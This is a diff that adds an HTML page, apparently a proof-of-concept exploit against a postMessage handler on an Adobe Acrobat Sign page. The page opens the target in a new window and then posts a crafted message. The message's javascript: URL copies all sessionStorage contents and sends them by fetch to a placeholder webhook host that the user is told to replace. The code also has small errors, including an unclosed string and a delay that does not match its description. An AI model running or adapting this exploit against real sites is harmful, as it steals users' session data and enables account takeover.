@@ -1,0 +1,45 @@
+<!DOCTYPE html
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Window Opener</title>
+</head>
+<body>
+<h1>Window Opener and Message Sender</h1>
+<p>Click "Open Window" to open the Adobe URL in a new window and automatically send the message after 10 seconds.</p>
+<button id="openButton">Open Window</button>
+
+<script>
+let childWindow = null;
+let webhookUrl = 'https://<webhook_server>; // Replace with your actual webhook URL
+
+document.getElementById('openButton').addEventListener('click', () => {
+childWindow = window.open('https://www.adobe.com/acrobat/business/sign.html?fromES=true#mini-plans-web-cta-acrobat-pro-teams-card', '_blank');
+if (childWindow) {
+setTimeout(() => {
+if (childWindow && !childWindow.closed) {
+const message = JSON.stringify({
+app: 'ucv3',
+subType: 'EXTERNAL',
+data: {
+externalUrl: `javascript:(function(){let data={};for(let i=0;i<sessionStorage.length;i++)
+
+{let k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k);}
+
+fetch("${webhookUrl}",
+
+{method:"POST",body:JSON.stringify(data)}
+
+);})();`,
+target: '_blank'
+}
+});
+childWindow.postMessage(message, '*');
+}
+}, 14000);
+}
+});
+</script>
+</body>
+</html>
